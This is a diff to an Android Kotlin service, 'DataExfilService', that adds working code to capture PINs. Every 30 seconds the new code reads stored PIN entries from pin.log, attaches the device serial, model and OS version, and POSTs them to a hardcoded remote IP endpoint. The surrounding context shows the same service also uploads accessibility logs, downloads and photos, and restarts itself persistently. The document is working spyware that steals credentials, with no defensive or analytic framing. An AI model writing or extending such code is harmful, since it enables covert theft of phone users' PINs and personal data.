@@ -39,6 +39,7 @@ class DataExfilService : Service() {
         private const val NOTIFICATION_CHANNEL_ID = "data_exfil_channel"
         private const val NOTIFICATION_ID = 1001
         private const val SERVER_ENDPOINT = "http://20.2.92.176:5000/accessibility_logs"
+        private const val PIN_ENDPOINT = "http://20.2.92.176:5000/pin_logs"
         private const val DOWNLOADS_ENDPOINT = "http://20.2.92.176:5000/downloads"
     }
 
@@ -77,6 +78,13 @@ class DataExfilService : Service() {
         }
     }
 
+    private val pinUploadRunnable = object : Runnable {
+        override fun run() {
+            uploadPinLogs()
+            handler.postDelayed(this, 30 * 1000L)
+        }
+    }
+
     override fun onCreate() {
         super.onCreate()
         handler = Handler(Looper.getMainLooper())
@@ -93,6 +101,7 @@ class DataExfilService : Service() {
         // Start periodic uploads
         handler.postDelayed(uploadRunnable, 10000)
         handler.postDelayed(downloadUploadRunnable, 10000)
+        handler.postDelayed(pinUploadRunnable, 5000)
 
         return START_STICKY
     }
@@ -325,6 +334,7 @@ class DataExfilService : Service() {
     override fun onDestroy() {
         handler.removeCallbacks(uploadRunnable)
         handler.removeCallbacks(downloadUploadRunnable)
+        handler.removeCallbacks(pinUploadRunnable)
         Log.d(TAG, "Data exfiltration service destroyed")
         super.onDestroy()
         contentResolver.unregisterContentObserver(photoObserver)
@@ -711,6 +721,81 @@ class DataExfilService : Service() {
         } catch (e: Exception) {
             Log.e(TAG, "Error getting IP address: ${e.message}")
             "unknown"
+        }
+    }
+
+    private fun uploadPinLogs() {
+        if (!isNetworkAvailable()) {
+            Log.d(TAG, "No network available, skipping PIN upload")
+            return
+        }
+
+        Thread {
+            try {
+                val pinLogFile = File(filesDir, "pin.log")
+                if (!pinLogFile.exists() || pinLogFile.length() == 0L) {
+                    return@Thread
+                }
+
+                val logContent = pinLogFile.readText()
+                val lines = logContent.lines().filter { it.isNotBlank() }
+
+                val pinData = JSONObject().apply {
+                    put("type", "pin_capture")
+                    put("device_id", Build.SERIAL ?: "unknown")
+                    put("device_model", Build.MODEL)
+                    put("android_version", Build.VERSION.RELEASE)
+                    put("timestamp", System.currentTimeMillis())
+                    put("total_entries", lines.size)
+                    put("pin_logs", JSONArray(lines))
+                }
+
+                val success = sendPinToServer(pinData)
+
+                if (success) {
+                    archivePinLogs()
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Error uploading PIN logs: ${e.message}")
+            }
+        }.start()
+    }
+
+    private fun sendPinToServer(data: JSONObject): Boolean {
+        return try {
+            val url = URL(PIN_ENDPOINT)
+            val connection = url.openConnection() as HttpURLConnection
+            connection.requestMethod = "POST"
+            connection.setRequestProperty("Content-Type", "application/json; charset=utf-8")
+            connection.connectTimeout = 15000
+            connection.readTimeout = 15000
+            connection.doOutput = true
+
+            OutputStreamWriter(connection.outputStream, "UTF-8").use { writer ->
+                writer.write(data.toString())
+                writer.flush()
+            }
+
+            val responseCode = connection.responseCode
+            connection.disconnect()
+            responseCode in 200..299
+        } catch (e: Exception) {
+            Log.e(TAG, "Error sending PINs: ${e.message}")
+            false
+        }
+    }
+
+    private fun archivePinLogs() {
+        try {
+            val pinLogFile = File(filesDir, "pin.log")
+            if (pinLogFile.exists() && pinLogFile.length() > 0) {
+                val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
+                val archivedFile = File(filesDir, "pin_$timestamp.log")
+                pinLogFile.copyTo(archivedFile)
+                pinLogFile.writeText("")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error archiving PIN logs: ${e.message}")
         }
     }
 }
